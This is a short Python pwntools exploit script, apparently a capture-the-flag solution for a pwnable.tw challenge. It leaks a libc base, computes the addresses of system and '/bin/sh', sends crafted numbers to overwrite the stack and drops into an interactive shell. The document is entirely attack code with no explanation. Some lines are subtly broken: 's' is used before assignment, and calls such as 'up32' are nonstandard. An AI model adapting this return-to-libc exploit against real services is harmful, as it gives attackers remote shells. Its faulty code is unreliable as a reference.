from pwn import *

ip='chall.pwnable.tw'
port=10101

s.remote(ip,port)

print s.recv(1024)
s.send('A'*25)
print recvuntil(s,'A'*24)

libc=up32(s.recv(4))-ord('A')-0x1b0000
tmp=4042322160 #0xf0f0f0f0

system_addr=libc+0x3a940
binsh_addr=libc+0x158e8b

print hex(system_addr)
print hex(binsh_addr)
print hex(libc)

print s.recv(1024)
s.sendline('50')

for i in range(0,11):
        print s.recv(1024)
        s.sendline(str(i))

for i in range(0,5):
        print s.recv(1024)
        s.sendline(str(tmp))

print s.recv(1024)
s.sendline(str(system_addr))

for i in range(0,2):
        print s.recv(1024)
        s.sendline(str(binsh_addr))

for i in range(0,4):
        print s.recv(1024)
        s.sendline('-1')

print s.recv(1024)
s.sendline('`')

print s.recv(1024)


s.interactive()

